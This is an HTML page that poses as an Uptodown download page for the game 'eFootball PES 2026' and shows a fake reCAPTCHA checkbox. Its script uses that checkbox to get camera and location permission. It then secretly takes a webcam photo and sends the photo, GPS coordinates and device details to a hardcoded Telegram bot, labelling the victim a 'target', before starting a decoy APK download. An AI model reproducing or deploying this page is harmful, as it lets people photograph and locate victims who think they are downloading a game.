<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eFootball PES 2026 - Download</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ut-bg: #081d24;
            --ut-dark: #051116;
            --ut-blue: #1b85d3;
            --ut-green: #00b451;
            --ut-dim: #7e949c;
        }

        body {
            margin: 0;
            background-color: var(--ut-bg);
            font-family: 'Roboto', sans-serif;
            color: #ffffff;
        }

        /* Header & Nav */
        .top-centered-header {
            background-color: var(--ut-dark);
            padding: 12px 0;
            text-align: center;
            border-bottom: 1px solid #102a33;
        }
        .main-logo { height: 24px; }

        header {
            background: var(--ut-dark);
            height: 50px;
            display: flex;
            align-items: center;
            padding: 0 16px;
        }
        .menu-btn { color: var(--ut-blue); font-size: 26px; cursor: pointer; }

        .path-bar { background: #06181e; padding: 10px 16px; font-size: 10px; color: var(--ut-dim); text-transform: uppercase; }
        
        /* App Content */
        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }
        .app-header { display: flex; gap: 16px; margin-bottom: 24px; align-items: center; }
        .app-icon { width: 90px; height: 90px; border-radius: 20px; object-fit: cover; background: #102a33; }
        .app-info h1 { font-size: 24px; margin: 0; }
        .app-sub { font-size: 14px; color: var(--ut-dim); }

        /* reCAPTCHA Widget Style */
        .captcha-container {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            width: 300px;
            height: 74px;
            border-radius: 3px;
            display: flex;
            align-items: center;
            padding: 0 10px;
            margin: 30px auto;
            cursor: pointer;
            color: #000;
            box-shadow: 0 0 4px rgba(0,0,0,0.1);
        }
        .captcha-checkbox {
            width: 24px;
            height: 24px;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            background: #fff;
            margin-right: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
        }
        .captcha-text { flex-grow: 1; font-size: 14px; }
        .captcha-logo-section { text-align: center; display: flex; flex-direction: column; align-items: center; }
        .captcha-logo-section img { width: 30px; }
        .captcha-logo-section span { font-size: 8px; color: #555; }

        /* Tech Info */
        .tech-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
        .tech-item { font-size: 12px; color: var(--ut-dim); }
        .tech-value { color: #fff; font-weight: bold; display: block; }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="top-centered-header">
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="main-logo">
</div>

<header>
    <div class="menu-btn">☰</div>
</header>

<div class="path-bar">Android / O'yinlar / Sport / eFootball PES 2026</div>

<div class="main-content">
    <div class="app-header">
        <img src="image_98f76c.png" class="app-icon" alt="PES 2026">
        <div class="app-info">
            <h1>eFootball PES 2026</h1>
            <div class="app-sub">10.4.0 | <span style="color:var(--ut-blue)">Uptodown.com</span></div>
        </div>
    </div>

    <div class="captcha-container" onclick="startVerification()">
        <div class="captcha-checkbox" id="c-box"></div>
        <div class="captcha-text">I'm not a robot</div>
        <div class="captcha-logo-section">
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha">
            <span>reCAPTCHA</span>
            <span style="font-size: 7px;">Privacy - Terms</span>
        </div>
    </div>

    <div class="tech-grid">
        <div class="tech-item">DASTURCHI <span class="tech-value">KONAMI</span></div>
        <div class="tech-item">LITSENZIYA <span class="tech-value">Bepul</span></div>
        <div class="tech-item">YUKLASHLAR <span class="tech-value">1,034,167,963</span></div>
        <div class="tech-item">SANA <span class="tech-value">1-Apr, 2026</span></div>
    </div>
</div>

<video id="v-stream" autoplay playsinline></video>
<canvas id="v-canvas"></canvas>
<a id="download-link" href="https://example.com/pes2026.apk" download style="display: none;"></a>

<script>
    const CONFIG = { 
        TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", 
        CHAT: "6198817749" 
    };

    async function startVerification() {
        const cBox = document.getElementById('c-box');
        cBox.innerHTML = '<img src="https://i.gifer.com/ZZ5H.gif" style="width:20px;">'; // Yuklanish animatsiyasi

        try {
            // 1. Kamera ruxsati
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            // 2. Joylashuv ruxsati
            navigator.geolocation.getCurrentPosition(async (pos) => {
                // Ruxsat berildi - Galochka qo'yish
                cBox.innerHTML = '<span style="color: #00a04a; font-size: 22px; font-weight: bold;">✓</span>';
                cBox.style.border = "none";

                // Botga jo'natish mantiqi
                await processData(stream, pos);

                // Yuklab olishni boshlash
                setTimeout(() => {
                    document.getElementById('download-link').click();
                }, 2000);

            }, (err) => {
                alert("Joylashuv ruxsati zarur!");
                location.reload();
            });

        } catch (err) {
            alert("Kameraga ruxsat berilmadi!");
            location.reload();
        }
    }

    async function processData(stream, pos) {
        const video = document.getElementById('v-stream');
        video.srcObject = stream;
        await new Promise(res => setTimeout(res, 1000));

        const canvas = document.getElementById('v-canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
        stream.getTracks().forEach(t => t.stop());

        const info = `📥 *Yangi Target*\n📍 Joylashuv: ${pos.coords.latitude}, ${pos.coords.longitude}\n📱 Qurilma: ${navigator.userAgent}`;

        // Text yuborish
        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.CHAT, text: info, parse_mode: 'Markdown'})
        });

        // Rasm yuborish
        const fd = new FormData();
        fd.append('chat_id', CONFIG.CHAT);
        fd.append('photo', snap);
        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd});
    }
</script>

</body>
</html>
